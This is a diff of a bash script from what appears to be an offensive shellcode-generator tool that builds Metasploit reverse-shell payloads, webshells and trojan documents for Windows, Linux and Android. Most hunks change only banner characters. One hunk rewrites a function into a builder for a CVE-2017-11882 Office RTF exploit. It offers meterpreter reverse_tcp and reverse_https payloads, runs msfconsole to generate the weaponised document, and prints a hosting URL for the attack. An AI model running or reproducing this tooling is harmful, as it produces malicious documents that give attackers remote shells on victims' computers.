@@ -213,7 +213,7 @@ echo "    |  build, embedded into one template (any language), obfuscated  |"
 echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
 echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
 echo "    ╠────────────────────────────────────────────────────────────────╝"
-echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(red_team)"
+echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
 echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R ARCH:$ArCh DISTRO:$DiStR0"
 echo "" && echo ""
 sleep 1
@@ -383,7 +383,7 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> UNIX
@@ -624,7 +624,7 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> UNIX
@@ -933,7 +933,7 @@ echo "[☠] Building shellcode -> dll format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : DLL -> WINDOWS
@@ -1173,7 +1173,7 @@ echo "[☠] Building shellcode -> C format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> WINDOWS
@@ -1454,7 +1454,7 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> WINDOWS
@@ -1758,7 +1758,7 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH-CMD -> WINDOWS
@@ -2061,7 +2061,7 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> WINDOWS
@@ -2262,7 +2262,7 @@ echo "[☠] Building shellcode -> msi format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : MSI -> WINDOWS
@@ -2523,7 +2523,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH -> WINDOWS
@@ -2817,7 +2817,7 @@ echo "[☠] Building shellcode -> HTA-PSH format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : HTA-PSH -> WINDOWS
@@ -3074,7 +3074,7 @@ echo "[☠] Building shellcode -> psh-cmd format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH-CMD -> WINDOWS
@@ -3319,7 +3319,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH-CMD -> WINDOWS
@@ -3594,7 +3594,7 @@ echo "[☠] Building shellcode -> vbs format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : VBS -> WINDOWS
@@ -3816,7 +3816,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH-CMD -> WINDOWS
@@ -4129,7 +4129,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | TROJAN  : $N4m.pdf
@@ -4672,7 +4672,7 @@ echo "[☠] Building shellcode -> php format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PHP - WEBSHELL
@@ -4820,7 +4820,7 @@ echo "[☠] Building shellcode -> php format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PHP -> WEBSHELL
@@ -5006,7 +5006,7 @@ echo "[☠] Building shellcode -> php format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PHP -> APACHE2 (linux)
@@ -5186,7 +5186,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PYTHON -> MULTI OS
@@ -5462,7 +5462,7 @@ echo "[☠] Building shellcode -> java format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : JAVA -> MULTI OS
@@ -5667,7 +5667,7 @@ echo "[☠] Building shellcode -> psh-cmd format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PSH-CMD -> WINDOWS
@@ -5855,7 +5855,7 @@ PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available pay
 cat << !
 
  shellcode settings
-+-------------------------------
+╔-------------------------------
 | LPORT   : $lport
 | URIPATH : /SecPatch
 | SRVHOST : $srvhost
@@ -6053,7 +6053,7 @@ filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload"
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | URIPATH : /SecPatch
 | SRVHOST : $srvhost
@@ -6238,7 +6238,7 @@ VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1
 cat << !
 
  shellcode settings
-+-------------------------------
+╔-------------------------------
 | SRVPORT : 8080
 | SRVHOST : $srvhost
 | FORMAT  : SH,PYTHON -> UNIX(s)
@@ -6375,7 +6375,7 @@ echo "[☠] Building shellcode -> DALVIK format ..."
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : DALVIK -> ANDROID
@@ -6548,7 +6548,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
@@ -6775,7 +6775,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
@@ -7165,7 +7165,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> WINDOWS(EXE)
@@ -7426,7 +7426,7 @@ sleep 2
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PYTHON -> MULTI OS
@@ -7805,7 +7805,7 @@ Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target 
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : $orm -> $Targ
@@ -8062,7 +8062,7 @@ N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : PYTHON -> WINDOWS
@@ -8267,23 +8267,25 @@ cd $IPATH/
 
 
 # ---------------------------------------------------------------------
-# cve2017-0199
+# cve-ms17_11882 (rtf world doc)
 # ---------------------------------------------------------------------
 sh_world25 () {
 # get user input to build shellcode
-echo "[☠] Enter shellcode settings!"
+echo "[☠] Enter exploit settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 280) > /dev/null 2>&1
-N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: office" --width 300) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 280) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ DOCUMENT NAME ☠" --text "Enter document output name\nexample: office" --width 300) > /dev/null 2>&1
+sleep 1
 
 
 # display final settings to user
 cat << !
 
- shellcode settings
-+------------------
+ exploit settings
+╔------------------
 | LHOST   : $lhost
-| FORMAT  : OFFICE -> WINDOWS(RTF)
+| CVE     : CVE-2017-11882
+| FORMAT  : MICROSOFT OFFICE -> WINDOWS(RTF)
 | PAYLOAD : $paylo
 |_AGENT   : $IPATH/output/$N4m.rtf
 
@@ -8292,41 +8294,45 @@ sleep 1
   #
   # check if all dependencies needed are installed
   #
+  echo "[☠] Checking exploit installation .."
+  sleep 1
   if [ -e $dep/office_ms17_11882.rb ]; then
-     echo "[☠] Exploit office_ms17_11882 -> found!"
+     echo "[✔] Exploit office_ms17_11882 -> found!"
      sleep 2
   else
      echo "[x] Exploit office_ms17_11882 -> not found!"
      sleep 2
-     echo "[!] Please wait, installing required module .."
+     echo "[*] Please wait, installing required module .."
      sleep 2
      cp $IPATH/templates/office_ms17_11882.rb $dep/office_ms17_11882.rb
-     echo "[!] Please wait, rebuilding msfdb .."
+     echo "[*] Please wait, rebuilding msfdb .."
      sleep 1
-     xterm -T " REBUILDING MSFBD " -geometry 168x28 -e "msfdb reinit" > /dev/null 2>&1
-     echo "[!] Please wait, reloading all module paths .."
+     xterm -T " REBUILDING MSFBD " -geometry 145x26 -e "msfdb reinit" > /dev/null 2>&1
+     echo "[*] Please wait, reloading all module paths .."
      sleep 1
-     xterm -T " RELOADING ALL MODULE PATHS " -geometry 168x28 -e "msfconsole -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
-     echo "[✔] Exploit office_ms17_11882 installed .."
+     xterm -T " RELOADING ALL MODULE PATHS " -geometry 145x26 -e "msfconsole -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+     echo "[✔] Exploit office_ms17_11882.rb installed .."
      sleep 2
   fi
 
 
 
   #
-  # build cve-2017-0199 RTF agent ..
+  # build CVE-2017-11882 RTF agent ..
   #
-  echo "[☠] Generating MS_word agent .."
+  echo "[☠] Generating MS_word agent (rtf) .."
   sleep 2
+  echo "[☠] Attack vector: http://$lhost:8080/doc"
+  sleep 1
   cd $IPATH/output
-  xterm -T " SHELLCODE GENERATOR " -geometry 168x28 -e "msfconsole -q -x 'use exploit/windows/fileformat/office_ms17_11882; set LHOST $lhost; set PAYLOAD $paylo; set FILENAME $IPATH/output/$N4m.rtf; exploit'" > /dev/null 2>&1
+  xterm -T " EXPLOIT CVE-2017-11882 (rtf) " -geometry 158x28 -e "msfconsole -x 'use exploit/windows/fileformat/office_ms17_11882; set LHOST $lhost; set PAYLOAD $paylo; set FILENAME $IPATH/output/$N4m.rtf; set URIPATH /doc; exploit'" > /dev/null 2>&1
   sleep 2
 
 
 
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
-rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
+# rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -8720,7 +8726,7 @@ fi
 cat << !
 
  shellcode settings
-+------------------
+╔------------------
 | LPORT   : $LpOrt
 | LHOST   : $LhOst
 | PAYLOAD : $paylo
